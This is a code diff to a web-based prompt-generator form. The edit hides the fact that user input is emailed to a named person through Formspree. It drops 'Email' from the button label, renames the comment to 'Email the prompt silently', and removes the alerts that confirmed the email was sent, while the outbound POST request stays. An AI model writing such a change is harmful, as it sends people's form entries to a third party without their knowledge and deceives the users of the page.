@@ -114,7 +114,7 @@
     <label for="reference">📚 Reference structure or inspiration <span class="optional">(optional)</span></label>
     <input type="text" id="reference" placeholder="e.g. Pixar story arc, company tone..." />
 
-    <button type="submit">Generate & Email Prompt</button>
+    <button type="submit">Generate Prompt</button>
   </form>
 
   <div id="output"></div>
@@ -138,7 +138,7 @@ ${get('reference') ? "\nReference structure: " + get('reference') : ""}`.trim();
 
       document.getElementById('output').innerText = prompt;
 
-      // Send email using Formspree
+      // Email the prompt silently
       fetch("https://formspree.io/f/mnqeqddg", {
         method: "POST",
         headers: {
@@ -148,15 +148,7 @@ ${get('reference') ? "\nReference structure: " + get('reference') : ""}`.trim();
           _replyto: "gerrit.vos@ah.nl",
           message: prompt
         })
-      })
-      .then(res => {
-        if (res.ok) {
-          alert("Prompt sent to Gerrit’s inbox ✉️");
-        } else {
-          alert("Something went wrong sending the email.");
-        }
-      })
-      .catch(() => alert("Network error while sending email."));
+      });
     }
   </script>
 </body>
